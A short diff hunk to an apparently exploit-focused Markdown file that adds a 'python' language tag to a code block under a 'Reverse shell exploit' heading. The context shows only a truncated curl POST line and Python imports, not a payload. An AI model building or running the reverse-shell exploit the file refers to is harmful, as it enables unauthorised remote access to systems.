@@ -151,7 +151,7 @@ curl -i -s -k  -X $'POST' \
 
 ### Reverse shell exploit:
 
-```
+```python
 import requests
 import sys
 import base64
